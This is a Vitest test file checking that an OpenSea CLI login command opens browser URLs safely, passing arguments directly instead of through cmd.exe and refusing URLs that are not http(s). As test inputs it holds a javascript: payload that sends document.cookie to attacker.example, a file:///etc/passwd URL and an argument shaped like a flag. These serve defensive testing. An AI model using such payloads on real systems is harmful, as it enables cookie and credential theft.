import { afterEach, beforeEach, describe, expect, it, vi } from "vitest"

const { loginWithLoopback, saveToken, spawn, OpenSeaOAuth, decodeJwtPayload } =
  vi.hoisted(() => ({
    loginWithLoopback: vi.fn(),
    saveToken: vi.fn(),
    spawn: vi.fn(),
    OpenSeaOAuth: vi.fn(() => ({})),
    decodeJwtPayload: vi.fn(),
  }))

vi.mock("node:child_process", async importOriginal => {
  const actual = await importOriginal<typeof import("node:child_process")>()
  return { ...actual, spawn }
})
vi.mock("@opensea/sdk", async importOriginal => {
  const actual = await importOriginal<typeof import("@opensea/sdk")>()
  return {
    OpenSeaOAuth,
    decodeJwtPayload,
    extractWalletAddress: actual.extractWalletAddress,
    OPENSEA_SCOPES: actual.OPENSEA_SCOPES,
  }
})
vi.mock("../../src/auth/oauth-login.js", () => ({ loginWithLoopback }))
vi.mock("../../src/auth/store.js", () => ({ saveToken }))

import { loginCommand } from "../../src/commands/login.js"
import type { OutputFormat } from "../../src/output.js"

const getFormat = () => "json" as OutputFormat

const AUTHORIZE_URL =
  "https://auth.opensea.io/oauth/v2/authorize?client_id=public-client&state=abc&scope=read%3Aeligibility"

/**
 * `process.platform` is a plain own property on `process`, so redefining it is
 * the only way to exercise the Windows branch from a macOS or Linux runner.
 */
function setPlatform(platform: NodeJS.Platform): void {
  Object.defineProperty(process, "platform", {
    value: platform,
    configurable: true,
  })
}

/**
 * Drives the real `openBrowser` wiring: the loopback flow is mocked, but the
 * `openBrowser` callback it receives is the command's own, so whatever the
 * command hands to `spawn` is what the shipped CLI hands to `spawn`.
 */
async function login(url: string): Promise<void> {
  loginWithLoopback.mockImplementation(
    (_oauth: unknown, opts: { openBrowser: (u: string) => void }) => {
      opts.openBrowser(url)
      return Promise.resolve({
        accessToken: "at",
        refreshToken: "rt",
        expiresAt: new Date("2030-01-01T00:00:00.000Z"),
        scopes: ["read:eligibility"],
      })
    },
  )
  const cmd = loginCommand(getFormat)
  await cmd.parseAsync(["--client-id", "public-client"], { from: "user" })
}

describe("openBrowser", () => {
  const realPlatform = process.platform
  let errSpy: ReturnType<typeof vi.spyOn>

  beforeEach(() => {
    vi.spyOn(console, "log").mockImplementation(() => {})
    errSpy = vi.spyOn(console, "error").mockImplementation(() => {})
    decodeJwtPayload.mockReturnValue({ wallet: "0xabc" })
    spawn.mockReturnValue({ on: vi.fn(), unref: vi.fn() })
  })

  afterEach(() => {
    setPlatform(realPlatform)
    vi.clearAllMocks()
    vi.restoreAllMocks()
  })

  it("launches the Windows browser opener by argv, never through cmd.exe", async () => {
    setPlatform("win32")

    await login(AUTHORIZE_URL)

    expect(spawn).toHaveBeenCalledTimes(1)
    const [command, args] = spawn.mock.calls[0] as [string, string[]]
    expect(command).toBe("rundll32")
    expect(args).toEqual(["url.dll,FileProtocolHandler", AUTHORIZE_URL])
    // `cmd /c start` re-parses its command line with cmd.exe's rules, under
    // which the `&` separating the OAuth query params starts a new command.
    expect(command).not.toBe("cmd")
    expect(args).not.toContain("/c")
    // Hand-added quotes are the tell that a value is being escaped for a
    // parser rather than passed as an argument.
    expect(args.some(arg => arg.includes('"'))).toBe(false)
  })

  it("uses the platform opener by argv on macOS and Linux", async () => {
    setPlatform("darwin")
    await login(AUTHORIZE_URL)
    expect(spawn).toHaveBeenCalledWith(
      "open",
      [AUTHORIZE_URL],
      expect.anything(),
    )

    spawn.mockClear()
    setPlatform("linux")
    await login(AUTHORIZE_URL)
    expect(spawn).toHaveBeenCalledWith(
      "xdg-open",
      [AUTHORIZE_URL],
      expect.anything(),
    )
  })

  it("refuses a non-http(s) authorization URL instead of spawning an opener", async () => {
    setPlatform("darwin")

    await login("javascript:fetch('http://attacker.example/'+document.cookie)")

    expect(spawn).not.toHaveBeenCalled()
    expect(
      errSpy.mock.calls.some(call =>
        String(call[0]).includes("Refusing to open a non-http(s)"),
      ),
    ).toBe(true)
  })

  it("refuses a file: authorization URL instead of spawning an opener", async () => {
    setPlatform("linux")

    await login("file:///etc/passwd")

    expect(spawn).not.toHaveBeenCalled()
  })

  it("refuses a value that is not a URL, so it cannot be read as an opener flag", async () => {
    setPlatform("darwin")

    await login("--version")

    expect(spawn).not.toHaveBeenCalled()
    expect(
      errSpy.mock.calls.some(call =>
        String(call[0]).includes("Refusing to open a malformed"),
      ),
    ).toBe(true)
  })

  it("passes the parsed serialization, not the raw string", async () => {
    setPlatform("win32")

    await login("https://auth.opensea.io/oauth/v2/authorize?a=1\n&b=2\t&c=3")

    expect(spawn).toHaveBeenCalledTimes(1)
    const [, args] = spawn.mock.calls[0] as [string, string[]]
    const passed = args[args.length - 1] as string
    // The WHATWG URL parser drops tab and newline; the raw string keeps them.
    expect(passed).toBe(
      "https://auth.opensea.io/oauth/v2/authorize?a=1&b=2&c=3",
    )
    expect(passed).not.toContain("\n")
    expect(passed).not.toContain("\t")
  })
})
